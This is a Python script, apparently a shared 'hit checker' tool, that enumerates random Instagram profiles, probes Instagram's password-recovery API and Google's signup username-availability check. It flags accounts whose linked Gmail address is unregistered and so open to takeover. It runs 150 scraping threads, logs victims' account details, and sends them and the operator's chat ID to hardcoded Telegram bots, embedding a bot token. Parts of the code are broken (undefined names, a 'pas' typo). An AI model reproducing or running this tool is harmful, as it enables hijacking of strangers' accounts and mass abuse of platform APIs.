try:
    from colorama import Fore, Style, init
except:
    os.system('pip install colorama')
    from colorama import Fore, Style, init

init(autoreset=True)
print(f"{Fore.YELLOW} 𝙀𝙉𝙅𝙊𝙔 𝙏𝙃𝙀 𝙁𝙍𝙀𝙀 𝙏𝙊𝙊𝙇 𝘽𝙔 𝙎𝙁 𝙓 𝙕𝙊𝙔𝘼💓🤍    ")
import os
hit_dustu = kotu_insta = orta_mail = 0
BLUE, RESET, BOLD, YELLOW, RED, GREEN, CYAN, MAGENTA = '\033[94m', '\033[0m', '\033[1m', '\033[93m', '\033[91m', '\033[92m', '\033[96m', '\033[95m'
import os, uuid, string, random, webbrowser
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests
import os,sys,time,py_compile
try:
  from cfonts import render, say
except:
    os.system('pip install python-cfonts')
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
B = '\033[2;36m'#سمائي
#مسح الشاشه
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
init(autoreset=True)



#----------SF----------------
API_CONFIG = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "ig_sig_key_version": "ig_sig_key_version",
    "signed_body": "signed_body",
    "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "content_type_header": "Content-Type",
    "cookie_header": "Cookie",
    "user_agent_header": "User-Agent",
    "default_user_agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ),
    "google_accounts_url": "https://accounts.google.com",
    "google_accounts_domain": "accounts.google.com",
    "referrer_header": "referer",
    "origin_header": "origin",
    "authority_header": "authority",
    "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "token_file": "tl.txt",
    "sf_domain": "@gmail.com"
}
#----------SF----------------


E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
G = '\033[1;34m'

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

import requests
import pyfiglet

# Create session
session = requests.Session()

# Banner using pyfiglet
banner = pyfiglet.figlet_format("           SF\nCollabration\n       ZOYA", font="slant")

# True RGB gold + bold
GOLD = "\033[1;38;2;255;215;0m"   # Bright gold
RESET = "\033[0m"

# Print banner in gold
print(GOLD + banner + RESET)
print(f"{G}▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n")
print(f'''{CYAN}  BY  : {YELLOW}| @shadowfighter05 x @zoyazi |
{CYAN}  CHANNEL  : {GREEN}| @FILEBYSF |
{CYAN}  FILE TYPE : {RED}| META + BIZZ |
{CYAN}  Creator  : {GREEN}| @RANVEERpy |''')
print(f"\n{G}▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n")

import requests

# User input
user_id = input(" 💓𝐂𝐇𝐀𝐓 𝐈𝐃 : ")
bot_token = input(" 🤍𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 : ")

print(" ⏳⌛️ 𝗪𝗔𝗜𝗧 𝗔 𝗠𝗢𝗠𝗘𝗡𝗧......")
import telebot
import time
import sys

BOT_TOKEN = '7971561559:AAFeAWczoo3GPsBtqjfTRdnH41vUSxSIHKU'

# Channels ke IDs aur usernames
CHANNELS = [
    {"id": -1002744528936, "username": "zoyairaa"},
    {"id": -1002525401323, "username": "filebysf"}
]

bot = telebot.TeleBot(BOT_TOKEN)

# Apna Telegram User ID
USER_ID = 123456789  # <-- Replace with your Telegram ID

def check_user_membership(user_id):
    is_member = False
    name = ""
    for channel in CHANNELS:
        try:
            member = bot.get_chat_member(channel["id"], user_id)
            name = member.user.first_name
            if member.status in ['member', 'administrator', 'creator']:
                is_member = True
                break  # Agar user kisi ek channel ka member hai, stop
        except:
            continue

    if is_member:
        print("\n 🧙🏻 𝗪𝗲𝗹𝗰𝗼𝗺𝗲", name, "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗔 𝗠𝗲𝗺𝗯𝗲𝗿✅                             \n")
    else:
        print("\n ❌ ᴡɪᴛʜᴏᴜᴛ ᴊᴏɪɴɪɴɢ ᴛʜᴇ ᴄʜᴀɴɴᴇʟs ʏᴏᴜ ᴄᴀɴ'ᴛ ᴜsᴇ ᴛʜᴇ ᴛᴏᴏʟ\n")
        print("🔗 Join these channels to continue:\n")
        # Spacing ke saath links show karna
        for channel in CHANNELS:
            print("     ➤ https://t.me/{}".format(channel['username']))
            print(" ")  # Extra line for spacing
        sys.exit()

check_user_membership(user_id)




def send_start_notification():
    try:
        bot_token = "7971561559:AAFeAWczoo3GPsBtqjfTRdnH41vUSxSIHKU"
        chat_ids = ["7305665779", "7331380618", "6340987944"]  # Add your second chat ID here
        message = "🚀 𝗦𝗰𝗿𝗶𝗽𝘁 𝘀𝘁𝗮𝗿𝘁𝗲𝗱 𝗲𝘅𝗲𝗰𝘂𝘁𝗶𝗼𝗻!\n\n🥳𝘚𝘍 × 𝘡𝘖𝘠𝘈 𝘴𝘪𝘴𝘵𝘦𝘳 𝘣𝘳𝘰𝘵𝘩𝘦𝘳 𝘤𝘰𝘭𝘭𝘢𝘣𝘰𝘳𝘢𝘵𝘪𝘰𝘯💓🤍\n\n🪪User ID: " + user_id
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        for chat_id in chat_ids:
            data = {"chat_id": chat_id, "text": message}
            requests.post(url, data=data, timeout=5)
    except:
        pas
# Call function
send_start_notification()


import os
from rich.console import Console
from pyfiglet import Figlet

# Clear terminal
os.system('cls' if os.name == 'nt' else 'clear')

console = Console()

# Font banner setup
fig = Figlet(font='slant')  # 'slant', 'block', 'standard'

# Render the main text
banner = fig.renderText("BROTHER × SISTER")

# Print with improved colors + center
console.print(banner, style="bold rgb(255,215,0)", justify="center")  # Real gold

# Subtext line
console.print("✨ COLLABORATION ✨", style="bold rgb(255,140,0)", justify="center")  # Dark orange
console.print("🦅 SF × ZOYA 🦅", style="bold rgb(0,191,255)", justify="center")  # Deep sky blue)




def pppp():
    # Stats calculation
    ge = hits
    bt = bad_insta + bad_email
    be = good_ig

    # Dynamic emojis
    hit_emoji = "🚀" * (ge // 50 + 1)
    bad_emoji = "❗" * (bt // 10 + 1)
    check_emoji = "🚧" * (be // 20 + 1)

    # SF × ZOYA Header
    header = "  🦅  𝗦𝗙 × 𝗭𝗢𝗬𝗔 𝗕𝗥𝗢𝗧𝗛𝗘𝗥 𝗔𝗡𝗗 𝗦𝗜𝗦𝗧𝗘𝗥 𝗖𝗢𝗟𝗟𝗔𝗕𝗢𝗥𝗔𝗧𝗜𝗢𝗡  🦅"

    # Separator
    separator = "☞" * 40

    # Print stats with formatting
    print(f"{separator}\n"
          f"{header.center(len(separator))}\n"
          f"{separator}\n"
          f"{GREEN}  𝐇𝐈𝐓𝐬 {hit_emoji} : {M}{ge}\n"
          f"{RED}  𝐁𝐀𝐃 {bad_emoji} : {M}{bt}\n"
          f"{YELLOW}  𝐁𝐀𝐃 𝐌𝐀𝐈𝐋 {check_emoji  } : {M}{be}  \n"
          f"{separator}  \n")
 

def update_stats():
    pppp()




def sf():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["user_agent_header"]: str(generate_user_agent())
        }
        recovery_url = (f"{API_CONFIG['google_accounts_url']}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        if match:
            tok = match.group(2)
        else:
            raise Exception("Token bulunamadı")
        cookies = {'__Host-GAPS': host}
        headers2 = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: ('https://accounts.google.com/signup/v2/createaccount'
                                            '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{API_CONFIG['google_accounts_url']}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)
        with open(API_CONFIG["token_file"], 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print("sf fonksiyonunda hata:", e)
        sf()


sf()
#


   #    
   
       # by @Ranveerpy 
def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(API_CONFIG["token_file"], 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{API_CONFIG['google_accounts_url']}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + API_CONFIG["sf_domain"]
            InfoAcc(email, full_email.split('@')[1])
        else:
            bad_email += 1
            update_stats()
    except Exception as e:
        print("check_gmail hata:", e)
        pass
#

 # 
      
      # @sf
def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        API_CONFIG["user_agent_header"]: ua,
        API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
        API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"]
    }
    data = {
        API_CONFIG["signed_body"]: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        API_CONFIG["ig_sig_key_version"]: '4'
    }
    response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).text
    if email in response:
        if API_CONFIG["sf_domain"] in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            API_CONFIG["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                              '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                              'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"],
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            API_CONFIG["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            API_CONFIG["ig_sig_key_version"]: '4'
        }
        response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).json()
        return response.get('email', 'bekar hai')
    except Exception as e:
        print("rest fonksiyonunda hata:", e)
        return 'bekar hai'

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 0)
    try:
        user_id_int = int(user_id)
    except:
        user_id_int = 0

    if 1 < user_id_int <= 1278889:
        reg_date = 2010
    elif 1279000 <= user_id_int <= 17750000:
        reg_date = 2011
    elif 17750001 <= user_id_int <= 279760000:
        reg_date = 2012
    elif 279760001 <= user_id_int <= 900990000:
        reg_date = 2013
    elif 900990001 <= user_id_int <= 1629010000:
        reg_date = 2014
    elif 1629010001 <= user_id_int <= 2369359761:
        reg_date = 2015
    elif 2369359762 <= user_id_int <= 4239516754:
        reg_date = 2016
    elif 4239516755 <= user_id_int <= 6345108209:
        reg_date = 2017
    elif 6345108210 <= user_id_int <= 10016232395:
        reg_date = 2018
    elif 10016232396 <= user_id_int <= 27238602159:
        reg_date = 2019
    elif 27238602160 <= user_id_int <= 43464475395:
        reg_date = 2020
    elif 43464475396 <= user_id_int <= 50289297647:
        reg_date = 2021
    elif 50289297648 <= user_id_int <= 57464707082:
        reg_date = 2022
    elif 57464707083 <= user_id_int <= 63313426938:
        reg_date = 2023
    else:
        reg_date = "2024 or 2025"

    followers = account_info.get('follower_count', 0)
    try:
        followers = int(followers)
    except:
        followers = 0
    if followers < 0:
        return

    following = account_info.get('following_count', '')
    try:
        if followers >= 10:
            meta = True
        else:
            meta = False
    except:
        meta = False

    business_meta = False
    if account_info.get('is_business'):
        business_meta = True
    elif account_info.get('is_professional_account'):
        business_meta = True
    elif account_info.get('category_name'):
        business_meta = True
    elif account_info.get('public_email') or account_info.get('phone_number'):
        business_meta = True

    total_hits += 1
    info_text = f"""

✨──────────────✨
🗂 𝐌𝐄𝐓𝐀  : {meta}  
💼 𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐌𝐄𝐓𝐀 : {business_meta}  
✨──────────────✨
✅ 𝐓𝐑𝐔𝐄 : {total_hits}  
👤 𝐀𝐂𝐂 𝐍𝐀𝐌𝐄 : {username}  
📧 𝐄𝐌𝐀𝐈𝐋 : {username}@{domain}  
👑 𝐅𝐎𝐋𝐋𝐎𝗪𝐄𝐑𝐒
: {followers}  
⚡ 𝐅𝐎𝐋𝐋𝐎𝗪𝐈𝐍𝐆 : {following}  
📅 𝐃𝐀𝐓𝐄 : {reg_date}  
📝 𝐁𝐈𝐎 : {account_info.get('biography','')}  
🔄 𝐑𝐄𝐒𝐄𝐓 : {rest(username)}  
🌐 𝗟𝗜𝗡𝗞 : https://www.instagram.com/{username}  
✨──────────────✨
⚙️ 𝗗𝗘𝗩 @zoyazi 𝗫 @shadowfighter05  
✨──────────────✨
🔗 𝗝𝗢𝗜𝗡 @zoyairaa | @sf_army  |  
𝗔𝗗𝗠𝗜𝗡 @shadowfighter05  
 𝗖𝗥𝗘𝗔𝗧𝗢𝗥: @RANVEERpy ✨
✨──────────────✨
😎 𝐈𝐟 𝐭𝐡𝐞𝐲 𝐡𝐚𝐭𝐞, 𝐢𝐭 𝐦𝐞𝐚𝐧𝐬 𝐢'𝐦 𝐝𝐨𝐢𝐧𝐠 𝐬𝐨𝐦𝐞𝐭𝐡𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭. 💓🤍
✨──────────────✨"""
    with open('new.txt', 'a') as f:
        f.write(info_text + "\n")
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception as e:
        print("Telegram mesajı gönderilemedi:", e)

def sf_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(3000000000, 42000000000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers < 10:
                    continue
                infoinsta[username] = account
                email = username + API_CONFIG["sf_domain"]
                check(email)
        except:
            pass


def stats_loop():
    while True:
        update_stats()
        time.sleep(0.1)

Thread(target=stats_loop, daemon=True).start()


for _ in range(150):
    Thread(target=sf_python).start()
